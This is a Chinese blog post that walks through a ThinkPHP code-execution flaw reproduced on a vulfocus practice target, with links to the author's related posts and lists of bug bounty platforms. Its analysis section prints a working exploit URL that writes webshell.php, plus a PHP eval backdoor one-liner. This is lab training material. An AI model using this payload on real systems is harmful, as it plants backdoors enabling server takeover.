# 原创
：  【漏洞复现-thinkphp-代码执行】vulfocus/thinkphp-cve_2018_1002015

# 【漏洞复现-thinkphp-代码执行】vulfocus/thinkphp-cve_2018_1002015

 <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）thinkphp命令执行（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

> 
<h2> <img alt="" height="23" src="https://img-blog.csdnimg.cn/19e90c25b42d4b368c3c94da4b04afb0.png" width="23"/>让读者如虎添翼</h2>
<table border="1" cellpadding="1" cellspacing="1"><tbody>|命令、代码执行博文|目标|状态
|[【漏洞复现-jupyter_notebook-命令执行】vulfocus/jupyter_notebook-cve_2019_9644](https://blog.csdn.net/qq_53079406/article/details/127491074)|发现功能点上的命令执行|已发布
|[【漏洞复现-solr-命令执行】vulfocus/solr-cve_2019_17558](https://blog.csdn.net/qq_53079406/article/details/127332723)|寻找模板（接口、配置文件）的命令执行漏洞|已发布
|[【漏洞复现-seaCms-命令执行】vulfocus/seacms-cnvd_2020_22721](https://blog.csdn.net/qq_53079406/article/details/127329791)|写入可执行文件|已发布
|[【漏洞复现-maccms-命令执行】vulfocus/maccms-cve_2017_17733](https://blog.csdn.net/qq_53079406/article/details/127328882)|参数中写入命令（加密）|已发布
|[【漏洞复现-webmin-命令执行】vulfocus/webmin-cve_2019_15107](https://blog.csdn.net/qq_53079406/article/details/127326071)|拼接执行命令|已发布
|[【漏洞复现-thinkphp-命令执行】vulfocus/thinkphp-3.2.x](https://blog.csdn.net/qq_53079406/article/details/127324775)|写入错误日志中|已发布
|[【漏洞复现-Discuz-代码执行】Discuz_CVE-2019-13956](https://blog.csdn.net/qq_53079406/article/details/127305443)|cookie中植入|已发布
|[【漏洞复现-骑士cms-代码执行】vulfocus/骑士cms_cve_2020_35339](https://blog.csdn.net/qq_53079406/article/details/127301708)|后台配置中植入命令|已发布
|[【漏洞复现-thinkphp-代码执行】vulfocus/thinkphp-cve_2018_1002015](https://blog.csdn.net/qq_53079406/article/details/127318349?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167298893316782425134312%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167298893316782425134312&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-127318349-null-null.blog_rank_default&amp;utm_term=1002015&amp;spm=1018.2226.3001.4450)|thinkphp命令执行|已发布
|更多复现漏洞将公布，敬请期待|——|——
</tbody></table>


---


**目录**

[一、靶场环境](#%E4%B8%80%E3%80%81%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83)

[1.1、平台：](#1.1%E3%80%81%E5%B9%B3%E5%8F%B0%EF%BC%9A)

[1.2、知识:](#1.2%E3%80%81%E6%BC%8F%E6%B4%9E%E7%89%88%E6%9C%AC%3A)

[二、漏洞验证](#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81)

[2.1、分析：](#2.1%E3%80%81%E5%88%86%E6%9E%90%EF%BC%9A)

[2.4、解题：](#2.4%E3%80%81%E8%A7%A3%E9%A2%98%EF%BC%9A)

---


## 一、靶场环境

> 
<h3>1.1、平台：</h3>
[【漏洞复现-骑士cms-代码执行】vulfocus/骑士cms_cve_2020_35339](https://vulfocus.cn/)

123.58.224.8:10744
<img alt="" height="428" src="https://img-blog.csdnimg.cn/226f12ae942d4f47af2994c1a3516925.png" width="864"/>​
 <img alt="" height="320" src="https://img-blog.csdnimg.cn/88cd82c9a13d47a182568b4f6edadf6a.png" width="1106"/>​




> 
<h3>1.2、知识:</h3>
1、invokeFunction
调用该接口，调用指定的函数
2、vars[]
定义变量
3、call_user_func_array
调用回调函数，并把一个数组参数作为回调函数的参数


---


---


## 二、漏洞验证

> 
<h3>2.1、分析：</h3>
POC：
/?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=**webshell.php**&amp;vars[1][]=
后面加上要执行的语句
后门文件名：
webshell.php
如getshell后门代码：
&lt;?php%20eval($_POST[%27pass%27]);?&gt;

<img alt="" height="642" src="https://img-blog.csdnimg.cn/e129567d238748d1b53094e9d51827fe.png" width="1200"/>​
 没报错
<img alt="" height="363" src="https://img-blog.csdnimg.cn/86c299d393c94759bf8f106006876961.png" width="1200"/>​
后门地址
http://ip:port/webshell.php
(连接成功)
<img alt="" height="807" src="https://img-blog.csdnimg.cn/43b9b97ffb0c44079a1b5dd55043c1c9.png" width="1200"/>​
<img alt="" height="807" src="https://img-blog.csdnimg.cn/0e3f4c2dde594f44889e1586bfc1ada0.png" width="1200"/>​


> 
<h3>2.4、解题：</h3>
<img alt="" height="807" src="https://img-blog.csdnimg.cn/e70ec142676c4c46a5331ff75098c369.png" width="1200"/>​



---


---


<img alt="" src="https://img-blog.csdnimg.cn/7d62be979184459ab44139ed85f387fe.png"/>​

> 
<h2><img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>​网络安全三年之约</h2>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/0052aabacbb147b482912c9fe1950f56.png" width="23"/>​First year </h3>
掌握各种原理、不断打新的靶场
<img alt="" height="23" src="https://img-blog.csdnimg.cn/6b308c9501174788aa24fa4e5ea8fdd2.png" width="23"/>​目标：edusrc、cnvd 
[主页 | 教育漏洞报告平台 (sjtu.edu.cn)https://src.sjtu.edu.cn/](https://src.sjtu.edu.cn/)[https://www.cnvd.org.cnhttps://www.cnvd.org.cn/](https://www.cnvd.org.cn/)
<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>​second year </h3>
不断学习、提升技术运用技巧，研究各种新平台
开始建立自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/3bc7983d3bac437fbcf8b3530e3ec8d3.png" width="23"/>​目标：众测平台、企业src应急响应中心 
<table border="1" cellpadding="1" cellspacing="1"><tbody>|众测平台|URL
|漏洞盒子|[漏洞盒子 | 互联网安全测试众测平台](https://www.vulbox.com/)
|火线安全平台|[火线安全平台](https://www.huoxian.cn/)
|漏洞银行|[BUGBANK 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台](https://www.bugbank.cn/)
|360漏洞众包响应平台|[360漏洞云漏洞众包响应平台](https://src.360.net/)
|补天平台（奇安信）|[补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC](https://www.butian.net/)
|春秋云测|[首页](https://zhongce.ichunqiu.com/)
|雷神众测（可信众测，安恒）|[雷神众测 - BountyTeam](https://www.bountyteam.com/)
|云众可信（启明星辰）|[云众可信 - 互联网安全服务引领者](https://www.cloudcrowd.com.cn/)
|ALLSEC|[ALLSEC](https://i.allsec.cn/#/)
|360众测|[360众测平台](https://zhongce.360.cn/)
|看雪众测（物联网）|[https://ce.kanxue.com/](https://ce.kanxue.com/)
|CNVD众测平台|[网络安全众测平台](https://zc.cnvd.org.cn/)
|工控互联网安全测试平台|[CNCERT工业互联网安全测试平台](https://test.ics-cert.org.cn/)
|慢雾（区块链）|[Submit Bug Bounty - SlowMist Zone - Blockchain Ecosystem Security Zone](https://slowmist.io/bug-bounty.html)
|平安汇聚|[http://isrc.pingan.com/homePage/index](http://isrc.pingan.com/homePage/index)
</tbody></table>


<table border="1" cellpadding="1" cellspacing="1"><tbody>|互联网大厂|URL
|阿里|https://asrc.alibaba.com/#/
|腾讯|https://security.tencent.com/
|百度|https://bsrc.baidu.com/v2/#/home
|美团|https://security.meituan.com/#/home
|360|https://security.360.cn/
|网易|https://aq.163.com/
|字节跳动|https://security.bytedance.com/
|京东|https://security.jd.com/#/
|新浪|http://sec.sina.com.cn/
|微博|https://wsrc.weibo.com/
|搜狗|http://sec.sogou.com/
|金山办公|https://security.wps.cn/
|有赞|https://src.youzan.com/
</tbody></table>

<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/18b63058b35848b19967730eb49fcb45.png" width="23"/>​Third Year </h3>
学习最新的知识，建全自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/7ccb45a55d5244edad5a9a1fabc55f08.png" width="23"/>​目标：参与护网（每一个男孩子心中的梦想） 
时间：一般5月面试，6/7月开始（持续2-3周）
分类：国家级护网、省级护网、市级护网、重大节日护网（如：建党、冬奥等）


### <img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>​second year 

---

